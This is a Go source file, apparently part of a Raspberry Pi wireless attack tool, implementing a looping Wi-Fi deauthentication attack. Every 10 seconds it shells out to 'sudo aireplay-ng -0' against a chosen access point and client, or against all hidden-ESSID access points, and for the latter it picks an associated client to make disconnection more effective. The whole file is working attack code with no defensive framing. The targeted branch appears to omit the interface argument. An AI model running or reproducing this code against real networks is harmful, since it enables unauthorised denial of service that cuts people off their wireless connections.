package modules

import (
	"os/exec"
	"time"

	"github.com/5N41P4/raspberry/internal/data"
)

func (i *Interface) RunDeauth(access *map[string]*data.AppAP, clients *map[string]*data.AppClient) {
	refresh := time.NewTicker(10 * time.Second)
	for {
		select {
		case <-refresh.C:
			if i.TargetBssid == "" {
				i.execDeauthAll(access, clients)
			} else {
				go i.execDeauth()
			}

		case <-i.deauth:
			refresh.Stop()
			return
		}
	}
}

func (i *Interface) execDeauth() {
	proc := exec.Command("sudo", "aireplay-ng", "-0", "5", "-a")

	proc.Args = append(proc.Args, i.TargetBssid)

	if i.TargetStation != "" {
		proc.Args = append(proc.Args, "-c")
		proc.Args = append(proc.Args, i.TargetStation)
	}
	_ = proc.Run()
}

func (i *Interface) execDeauthAll(access *map[string]*data.AppAP, clients *map[string]*data.AppClient) {
	for _, ap := range *access {
		proc := exec.Command("sudo", "aireplay-ng", "-0", "5", "-a")
		// Run the Deauth attack for all AP's that don't show an ESSID
		if ap.Essid == "" {
			proc.Args = append(proc.Args, ap.Bssid)
			// Check if the AP has an associated client, as that would make the deauth more effective
			for _, cl := range *clients {
				if cl.Bssid == ap.Bssid {
					proc.Args = append(proc.Args, "-c")
					proc.Args = append(proc.Args, cl.Station)
					break
				}
			}
			proc.Args = append(proc.Args, i.Name)
			_ = proc.Run()
		}
	}

}
